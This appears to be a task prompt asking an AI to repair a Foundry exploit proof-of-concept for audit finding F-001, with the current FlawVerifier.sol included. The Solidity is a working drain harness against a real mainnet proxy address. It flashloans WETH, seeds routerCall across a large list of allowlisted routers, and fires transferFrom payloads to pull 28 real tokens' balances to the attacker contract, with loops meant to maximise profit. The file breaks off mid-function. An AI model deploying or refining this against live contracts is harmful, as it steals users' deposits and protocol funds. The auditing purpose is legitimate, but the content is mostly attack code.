You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Shared router/gateway allowlist plus sticky max approvals lets allowlisted spenders drain proxy tokens
- claim: `routerCall` authorizes `_gateway` and `_params.router` from the same shared `availableRouters` set, then `SmartApprove` grants `_gateway` a `type(uint256).max` allowance whenever the current allowance is insufficient. That allowance is never reset after the route finishes, and `removeAvailableRouter` only updates the set membership without revoking existing ERC20 approvals.
- impact: Any current or former allowlisted address that can act as a spender for the token can retain permanent pull rights over the proxy and later drain present and future balances of that token, including later user deposits, stuck funds, and accrued fees. The shared allowlist also means adding a router for call execution implicitly makes it eligible to become such a spender.
- exploit_paths: ["Admin allowlists router/spender address `R` via initialization or `addAvailableRouter`.", "A user executes a successful `routerCall` using `_gateway = R`, causing the proxy to grant `R` an unlimited allowance for the route token.", "The route completes, but the token approval remains in place because neither `routerCall` nor `removeAvailableRouter` clears it.", "At any later time, `R` or a compromised/upgraded controller behind `R` calls `transferFrom(proxy, attacker, amount)` and drains the proxy's balance of that token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address internal constant METAROUTER = address(uint160(0x00b9e13785127bffcc3dc970a55f6c7bf0844a3c15));
    address internal constant METAROUTER_GATEWAY = address(uint160(0x0003b7551eb0162c838a10c2437b60d1f5455b9554));
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    string internal constant PATH_0 =
        "Admin allowlists router/spender address R via initialization or addAvailableRouter.";
    string internal constant PATH_1 =
        "A user executes routerCall using _gateway = R, causing the proxy to grant R a sticky max approval for the route token.";
    string internal constant PATH_2 =
        "The route completes, the approval persists, and R later pulls tokens from the proxy with transferFrom.";
    string internal constant PATH_3 =
        "Even if R is later absent from the current allowlist, the ERC20 approval remains live because removeAvailableRouter does not revoke token approvals.";

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _coveredPaths;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path = string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory currentRouters = _currentRouters();
        address[] memory spenderCandidates = _spenderCandidates(currentRouters);
        address[] memory tokens = _candidateTokens();

        _runAmplificationRounds(currentRouters, spenderCandidates, tokens, 2);
        uint256 bestScore = _currentScore();

        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            _runAmplificationRounds(currentRouters, spenderCandidates, tokens, 1);
            uint256 newScore = _currentScore();
            if (newScore <= bestScore) {
                break;
            }
            bestScore = newScore;
        }

        if (_profitAmount > 0) {
            _validated = true;
            _verdict = "validated";
            _path = _bestObservedNarrative();
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed live proxy token approvals to current-or-former allowlisted spenders, but no scanned public spender or controller entrypoint completed the later drain step profitably on this fork.";
            _verdict = "refuted";
            return;
        }

        _path =
            "This fork did not expose a profitable persisted approval on the scanned allowlisted spenders, and the fresh-seed routerCall path did not complete through the probed public router, controller, and gateway entrypoints.";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function coveredPathsBitmap() external view returns (uint256) {
        return _coveredPaths;
    }

    function pathCovered(uint256 index) external view returns (bool) {
        return _isPathCovered(index);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address pair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(WETH, USDC);
        require(msg.sender == pair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = abi.decode(data, (uint256, uint256, uint256));
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed >= grossAmount + fixedFee, "borrow too small");

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        require(_forceApprove(WETH, TARGET, grossAmount), "approve failed");

        address[] memory currentRouters = _currentRouters();
        address[] memory spenderCandidates = _spenderCandidates(currentRouters);

        bool seeded = _trySeedAcrossRouters(WETH, grossAmount, amountIn, fixedFee, currentRouters);
        if (seeded) {
            uint256 proxyBalance = _balanceOf(WETH, TARGET);
            if (proxyBalance != 0) {
                _drainWithObservedApprovals(WETH, proxyBalance, spenderCandidates, currentRouters);
            }
        }

        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;
        require(IERC20Like(WETH).transfer(msg.sender, repayAmount), "repay failed");
    }

    function _runAmplificationRounds(
        address[] memory currentRouters,
        address[] memory spenderCandidates,
        address[] memory tokens,
        uint256 rounds
    ) internal {
        for (uint256 round = 0; round < rounds; round++) {
            _runAmplificationRound(currentRouters, spenderCandidates, tokens, true);
        }
    }

    function _runAmplificationRound(
        address[] memory currentRouters,
        address[] memory spenderCandidates,
        address[] memory tokens,
        bool includeFreshSeed
    ) internal {
        if (includeFreshSeed) {
            _attemptFreshWethApproval(currentRouters);
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (!_hasCode(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            _drainWithObservedApprovals(token, proxyBalance, spenderCandidates, currentRouters);
        }
    }

    function _attemptFreshWethApproval(address[] memory currentRouters) internal returns (bool) {
        if (currentRouters.length == 0) {
            return false;
        }

        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(WETH);
        if (grossAmount == 0 || amountIn == 0 || grossAmount <= fixedFee) {
            return false;
        }

        address pair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(WETH, USDC);
        if (pair == address(0)) {
            return false;
        }

        uint256 borrowAmount = grossAmount + fixedFee;
        uint256 beforeBalance = _balanceOf(WETH, address(this));
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? borrowAmount : 0;
        uint256 amount1Out = token0 == WETH ? 0 : borrowAmount;

        (bool ok, ) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(fixedFee, grossAmount, amountIn)
            )
        );

        if (!ok) {
            return false;
        }

        uint256 afterBalance = _balanceOf(WETH, address(this));
        if (afterBalance > beforeBalance) {
            _recordTokenProfit(WETH, afterBalance - beforeBalance, _bestObservedNarrative());
        }

        return _profitAmount > 0 || _staleApprovalObserved;
    }

    function _drainWithObservedApprovals(
        address token,
        uint256 proxyBalance,
        address[] memory spenderCandidates,
        address[] memory currentRouters
    ) internal returns (uint256) {
        for (uint256 i = 0; i < spenderCandidates.length; i++) {
            address spender = spenderCandidates[i];
            if (!_hasCode(spender)) {
                continue;
            }

            uint256 approval = _observeApprovalState(token, spender, currentRouters);
            if (approval == 0) {
                continue;
            }

            uint256 amount = approval < proxyBalance ? approval : proxyBalance;
            if (amount == 0) {
                continue;
            }

            if (_attemptGatewayDrain(spender, token, TARGET, address(this), amount, currentRouters)) {
                proxyBalance = _balanceOf(token, TARGET);
                if (proxyBalance == 0) {
                    return 0;
                }
            }
        }

        return proxyBalance;
    }

    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {
        fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));
        grossAmount = IRubicProxyLike(TARGET).minTokenAmount(token);
        if (grossAmount == 0) {
            grossAmount = _defaultSeedAmount(token);
        }

        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
        }

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
    }

    function _trySeedAcrossRouters(
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address[] memory currentRouters
    ) internal returns (bool) {
        if (
            _contains(currentRouters, currentRouters.length, METAROUTER) &&
            _contains(currentRouters, currentRouters.length, METAROUTER_GATEWAY)
        ) {
            if (_trySeedWithRouterAndGateway(METAROUTER, METAROUTER_GATEWAY, token, grossAmount, amountIn, fixedFee)) {
                uint256 remainingMeta = _balanceOf(token, TARGET);
                if (remainingMeta != 0) {
                    _attemptGatewayDrain(METAROUTER_GATEWAY, token, TARGET, address(this), remainingMeta, currentRouters);
                }
                return true;
            }
        }

        address[2] memory preferredGateways = [MOVR_BRIDGE, METAROUTER_GATEWAY];
        for (uint256 i = 0; i < preferredGateways.length; i++) {
            address gateway = preferredGateways[i];
            if (!_contains(currentRouters, currentRouters.length, gateway) || !_hasCode(gateway)) {
                continue;
            }
            if (_trySeedWithRouterAndGateway(gateway, gateway, token, grossAmount, amountIn, fixedFee)) {
                uint256 remainingPreferred = _balanceOf(token, TARGET);
                if (remainingPreferred != 0) {
                    _attemptGatewayDrain(gateway, token, TARGET, address(this), remainingPreferred, currentRouters);
                }
                return true;
            }
        }

        for (uint256 i = 0; i < currentRouters.length; i++) {
            address router = currentRouters[i];
            if (!_hasCode(router)) {
                continue;
            }

            if (_trySeedWithRouterAndGateway(router, router, token, grossAmount, amountIn, fixedFee)) {
                uint256 remaining = _balanceOf(token, TARGET);
                if (remaining != 0) {
                    _attemptGatewayDrain(router, token, TARGET, address(this), remaining, currentRouters);
                }
                return true;
            }
        }

        return false;
    }

    function _trySeedWithRouterAndGateway(
        address router,
        address gateway,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[18] memory gatewayPayloads = _gatewayPayloads(token, TARGET, address(this), amountIn);
        bytes[9] memory exitPayloads = _gatewayExitPayloads(token, TARGET, address(this), amountIn);

        if (router == gateway) {
            for (uint256 i = 0; i < gatewayPayloads.length; i++) {
                bytes memory directPayload = gatewayPayloads[i];
                if (directPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, amountIn, fixedFee, directPayload)) {
                    return true;
                }
            }

            for (uint256 i = 0; i < exitPayloads.length; i++) {
                bytes memory exitPayload = exitPayloads[i];
                if (exitPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, amountIn, fixedFee, exitPayload)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < gatewayPayloads.length; i++) {
            bytes memory gatewayPayload = gatewayPayloads[i];
            if (gatewayPayload.length == 0) {
                continue;
            }

            bytes[16] memory routerPayloads = _routerForwardPayloads(gateway, gatewayPayload);
            for (uint256 j = 0; j < routerPayloads.length; j++) {
                bytes memory routerPayload = routerPayloads[j];
                if (routerPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, amountIn, fixedFee, routerPayload)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < exitPayloads.length; i++) {
            bytes memory gatewayExitPayload = exitPayloads[i];
            if (gatewayExitPayload.length == 0) {
                continue;
            }

            bytes[16] memory routerExitPayloads = _routerForwardPayloads(gateway, gatewayExitPayload);
            for (uint256 j = 0; j < routerExitPayloads.length; j++) {
                bytes memory routerExitPayload = routerExitPayloads[j];
                if (routerExitPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, amountIn, fixedFee, routerExitPayload)) {
                    return true;
                }
            }
        }

        if (router == METAROUTER && gateway == METAROUTER_GATEWAY) {
            bytes memory metaRoutePayload = _metaRouterSeedPayload(token, amountIn);
            if (
                metaRoutePayload.length != 0 &&
                _tryRouterCall(params, gateway, token, amountIn, fixedFee, metaRoutePayload)
            ) {
                return true;
            }
        }

        return false;
    }

    function _tryRouterCall(
        IRubicProxyLike.BaseCrossChainParams memory params,
        address gateway,
        address token,
        uint256 expectedSpend,
        uint256 fixedFee,
        bytes memory data
    ) internal returns (bool) {
        uint256 beforeLocal = _balanceOf(token, address(this));
        uint256 beforeProxy = _balanceOf(token, TARGET);

        (bool ok, ) = TARGET.call{value: fixedFee}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)
        );
        if (!ok) {
            return false;
        }

        uint256 afterLocal = _balanceOf(token, address(this));
        uint256 afterProxy = _balanceOf(token, TARGET);
        uint256 lingeringApproval = _allowance(token, TARGET, gateway);

        if (lingeringApproval != 0) {
            _markPath(0);
            _markPath(1);
            _staleApprovalObserved = true;
        }

        if (afterLocal > beforeLocal) {
            _recordTokenProfit(token, afterLocal - beforeLocal, _bestObservedNarrative());
        }

        if (beforeProxy > afterProxy && beforeProxy - afterProxy >= expectedSpend) {
            return true;
        }

        return lingeringApproval != 0 || afterLocal > beforeLocal;
    }

    function _attemptGatewayDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount,
        address[] memory controllers
    ) internal returns (bool) {
        bytes[18] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);
        bytes[9] memory exitPayloads = _gatewayExitPayloads(token, proxy, attacker, amount);

        if (_attemptDirectDrain(gateway, token, proxy, amount, payloads)) {
            return true;
        }

        if (_attemptDirectExit(gateway, token, proxy, amount, exitPayloads)) {
            return true;
        }

        for (uint256 i = 0; i < controllers.length; i++) {
            address controller = controllers[i];
            if (controller == address(0) || controller == gateway || !_hasCode(controller)) {
                continue;
            }

            if (_attemptForwardedDrain(controller, gateway, token, proxy, amount, payloads)) {
                return true;
            }

            if (_attemptForwardedExit(controller, gateway, token, proxy, amount, exitPayloads)) {
                return true;
            }
        }

        return false;
    }

    function _attemptDirectDrain(
        address gateway,
        address token,
        address,
        uint256,
        bytes[18] memory payloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory payload = payloads[i];
            if (payload.length == 0) {
                continue;
            }

            uint256 beforeBalance = _balanceOf(token, address(this));
            (bool ok, ) = gateway.call(payload);
            uint256 afterBalance = _balanceOf(token, address(this));
            if (!ok || afterBalance <= beforeBalance) {
                continue;
            }

            _markPath(2);
            _recordTokenProfit(token, afterBalance - beforeBalance, _bestObservedNarrative());
            return true;
        }

        return false;
    }

    function _attemptDirectExit(
        address gateway,
        address token,
        address proxy,
        uint256,
        bytes[9] memory exitPayloads
    ) internal returns (bool) {
        uint256 beforeProxy = _balanceOf(token, proxy);
        for (uint256 i = 0; i < exitPayloads.length; i++) {
            bytes memory payload = exitPayloads[i];
            if (payload.length == 0) {
                continue;
            }

            (bool ok, ) = gateway.call(payload);
            uint256 afterProxy = _balanceOf(token, proxy);
            if (!ok || afterProxy >= beforeProxy) {
                continue;
            }

            uint256 drained = beforeProxy - afterProxy;
            _markPath(2);
            _recordTokenProfit(token, drained, _bestObservedNarrative());
            return true;
        }

        return false;
    }

    function _attemptForwardedDrain(
        address controller,
        address gateway,
        address token,
        address,
        uint256,
        bytes[18] memory payloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory inner = payloads[i];
            if (inner.length == 0) {
                continue;
            }

            bytes[16] memory wrappers = _routerForwardPayloads(gateway, inner);
            for (uint256 j = 0; j < wrappers.length; j++) {
                bytes memory wrapped = wrappers[j];
                if (wrapped.length == 0) {
                    continue;
                }

                uint256 beforeBalance = _balanceOf(token, address(this));
                (bool ok, ) = controller.call(wrapped);
                uint256 afterBalance = _balanceOf(token, address(this));
                if (!ok || afterBalance <= beforeBalance) {
                    continue;
                }

                _markPath(2);
                _recordTokenProfit(token, afterBalance - beforeBalance, _bestObservedNarrative());
                return true;
            }
        }

        return false;
    }

    function _attemptForwardedExit(
        address controller,
        address gateway,
        address token,
        address proxy,
        uint256,
        bytes[9] memory exitPayloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < exitPayloads.length; i++) {
            bytes memory inner = exitPayloads[i];
            if (inner.length == 0) {
                continue;
            }

            bytes[16] memory wrappers = _routerForwardPayloads(gateway, inner);
            uint256 beforeProxy = _balanceOf(token, proxy);
            for (uint256 j = 0; j < wrappers.length; j++) {
                bytes memory wrapped = wrappers[j];
                if (wrapped.length == 0) {
                    continue;
                }

                (bool ok, ) = controller.call(wrapped);
                uint256 afterProxy = _balanceOf(token, proxy);
                if (!ok || afterProxy >= beforeProxy) {
                    continue;
                }

                uint256 drained = beforeProxy - afterProxy;
                _markPath(2);
                _recordTokenProfit(token, drained, _bestObservedNarrative());
                return true;
            }
        }

        return false;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (amount == 0) {
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
            _validated = true;
            _verdict = "validated";
        }
    }

    function _currentScore() internal view returns (uint256) {
        return _profitAmount;
    }

    function _currentRouters() internal view returns (address[] memory merged) {
        address[] memory live;
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }

        address[] memory snapshot = _allowlistedSnapshot();
        merged = new address[](live.length + snapshot.length);
        uint256 count;

        for (uint256 i = 0; i < live.length; i++) {
            if (live[i] != address(0) && !_contains(merged, count, live[i])) {
                merged[count++] = live[i];
            }
        }

        for (uint256 i = 0; i < snapshot.length; i++) {
            if (snapshot[i] != address(0) && !_contains(merged, count, snapshot[i])) {
                merged[count++] = snapshot[i];
            }
        }

        assembly {
            mstore(merged, count)
        }
    }

    function _spenderCandidates(address[] memory currentRouters) internal pure returns (address[] memory spenders) {
        address[] memory snapshot = _allowlistedSnapshot();
        address[] memory extras = new address[](18);
        extras[0] = MOVR_BRIDGE;
        extras[1] = METAROUTER_GATEWAY;
        extras[2] = METAROUTER;
        extras[3] = address(uint160(0x001111111254fb6c44bac0bed2854e76f90643097d));
        extras[4] = address(uint160(0x001111111254eeb25477b68fb85ed929f73a960582));
        extras[5] = address(uint160(0x00def1c0ded9bec7f1a1670819833240f027b25eff));
        extras[6] = address(uint160(0x00def171fe48cf0115b1d80b88dc8eab59176fee57));
        extras[7] = address(uint160(0x00216b4b4ba9f3e719726886d34a177484278bfcae));
        extras[8] = address(uint160(0x001231deb6f5749ef6ce6943a275a1d3e7486f4eae));
        extras[9] = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        extras[10] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
        extras[11] = address(uint160(0x008731d54e9d02c286767d56ac03e8037c07e01e98));
        extras[12] = address(uint160(0x005427fefa711eff984124bfbb1ab6fbf5e3da1820));
        extras[13] = address(uint160(0x0099c9fc46f92e8a1c0dec1b1747d010903e884be1));
        extras[14] = address(uint160(0x0040ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf));
        extras[15] = address(uint160(0x00a0c68c638235ee32657e8f720a23cec1bfc77c77));
        extras[16] = address(uint160(0x003e4a3a4796d16c0cd582c382691998f7c06420b6));
        extras[17] = address(uint160(0x0003666f603cc164936c1b87e207f36bbeba4ac5f18));

        spenders = new address[](currentRouters.length + snapshot.length + extras.length);
        uint256 count;
        for (uint256 i = 0; i < currentRouters.length; i++) {
            if (currentRouters[i] != address(0) && !_contains(spenders, count, currentRouters[i])) {
                spenders[count++] = currentRouters[i];
            }
        }
        for (uint256 i = 0; i < snapshot.length; i++) {
            if (snapshot[i] != address(0) && !_contains(spenders, count, snapshot[i])) {
                spenders[count++] = snapshot[i];
            }
        }
        for (uint256 i = 0; i < extras.length; i++) {
            if (extras[i] != address(0) && !_contains(spenders, count, extras[i])) {
                spenders[count++] = extras[i];
            }
        }

        assembly {
            mstore(spenders, count)
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](28);
        tokens[0] = WETH;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = DAI;
        tokens[4] = WBTC;
        tokens[5] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        tokens[6] = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
        tokens[7] = 0x0000000000085d4780B73119b644AE5ecd22b376;
        tokens[8] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
        tokens[9] = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        tokens[10] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
        tokens[11] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        tokens[12] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
        tokens[13] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        tokens[14] = 0xae78736Cd615f374D3085123A210448E74Fc6393;
        tokens[15] = address(uint160(0x007f39c581f595b53c5cb5affffb3dbabeb35e6a12));
        tokens[16] = address(uint160(0x00be9895146f7af43049ca1c1ae358b0541ea49704));
        tokens[17] = address(uint160(0x00c00e94cb662c3520282e6f5717214004a7f26888));
        tokens[18] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        tokens[19] = address(uint160(0x006b3595068778dd592e39a122f4f5a5cf09c90fe2));
        tokens[20] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        tokens[21] = 0x111111111117dC0aa78b770fA6A738034120C302;
        tokens[22] = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
        tokens[23] = address(uint160(0x00a0b73e1f5ff8e0cf3b4a3cf9b5d5b0a5f8a4a8d0));
        tokens[24] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
        tokens[25] = address(uint160(0x0099d8a9c45b2ec6c0d16c1f0d7181f7ec3d9b5b55));
        tokens[26] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
        tokens[27] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    }

    function _allowlistedSnapshot() internal pure returns (address[] memory routers) {
        routers = new address[](37);
        routers[0] = address(uint160(0x00663dc15d3c1ac63ff12e45ab68fea3f0a883c251));
        routers[1] = METAROUTER;
        routers[2] = METAROUTER_GATEWAY;
        routers[3] = address(uint160(0x00935bbf5c69225e3eda7c3aa542a7baa5c5c30094));
        routers[4] = MOVR_BRIDGE;
        routers[5] = address(uint160(0x000e3eb2eab0e524b69c79e24910f4318db46baa9c));
        routers[6] = address(uint160(0x0073ce60416035b8d7019f6399778c14ccf5c9c7a1));
        routers[7] = address(uint160(0x00a0c68c638235ee32657e8f720a23cec1bfc77c77));
        routers[8] = address(uint160(0x0040ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf));
        routers[9] = USDC;
        routers[10] = address(uint160(0x00362fa9d0bca5d19f743db50738345ce2b40ec99f));
        routers[11] = address(uint160(0x002a5c2568b10a0e826bfa892cf21ba7218310180b));
        routers[12] = address(uint160(0x00f9fb1c508ff49f78b60d3a96dea99fa5d7f3a8a6));
        routers[13] = address(uint160(0x008731d54e9d02c286767d56ac03e8037c07e01e98));
        routers[14] = address(uint160(0x00150f94b44927f078737562f0fcf3c95c01cc2376));
        routers[15] = address(uint160(0x000e95fd76cf16008c12ff3b3a937cb16cd9cc2028));
        routers[16] = address(uint160(0x004d9079bb4165aeb4084c526a32695dcfd2f77381));
        routers[17] = address(uint160(0x004dbd4fc535ac27206064b68ffcf827b0a60bab3f));
        routers[18] = address(uint160(0x00a3a7b6f88361f48403514059f1f16c8e78d60eec));
        routers[19] = address(uint160(0x00d3b5b60020504bc3489d6949d545893982ba3011));
        routers[20] = address(uint160(0x00cee284f754e854890e311e3280b767f80797180d));
        routers[21] = address(uint160(0x00d92023e9d9911199a6711321d1277285e6d4e2db));
        routers[22] = address(uint160(0x0072ce9c846789fdb6fc1f34ac4ad25dd9ef7031ef));
        routers[23] = address(uint160(0x0023ddd3e3692d1861ed57ede224608875809e127f));
        routers[24] = address(uint160(0x006bfad42cfc4efc96f529d786d643ff4a8b89fa52));
        routers[25] = address(uint160(0x0099c9fc46f92e8a1c0dec1b1747d010903e884be1));
        routers[26] = address(uint160(0x00aba2c5f108f7e820c049d5af70b16ac266c8f128));
        routers[27] = address(uint160(0x0010e6593cdda8c58a1d0f14c5164b376352a55f2f));
        routers[28] = address(uint160(0x00c5b1ec605738ef73a4efc562274c1c0b6609cf59));
        routers[29] = address(uint160(0x005427fefa711eff984124bfbb1ab6fbf5e3da1820));
        routers[30] = address(uint160(0x0003666f603cc164936c1b87e207f36bbeba4ac5f18));
        routers[31] = address(uint160(0x003e4a3a4796d16c0cd582c382691998f7c06420b6));
        routers[32] = address(uint160(0x0022b1cbb8d98a01a3b71d034bb899775a76eb1cc2));
        routers[33] = address(uint160(0x003d4cc8a61c7528fd86c55cfe061a78dcba48edd1));
        routers[34] = address(uint160(0x00b8901acb165ed027e32754e0ffe830802919727f));
        routers[35] = address(uint160(0x00b98454270065a31d71bf635f6f7ee6a518dfb849));
        routers[36] = address(uint160(0x0092e929d8b2c8430bcaf4cd87654789578bb2b786));
    }

    function _metaRouterSeedPayload(address token, uint256 amount) internal view returns (bytes memory) {
        address[] memory approvedTokens = new address[](1);
        approvedTokens[0] = token;

        bytes memory relayCall = abi.encodeWithSelector(
            bytes4(keccak256("transfer(address,uint256)")),
            address(this),
            amount
        );

        return abi.encodeWithSelector(
            bytes4(keccak256("metaRoute((bytes,bytes,address[],address,address,uint256,bool,address,bytes))")),
            abi.encode(bytes(""), bytes(""), approvedTokens, address(0), address(0), amount, false, token, relayCall)
        );
    }

    function _gatewayPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[18] memory payloads) {
        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
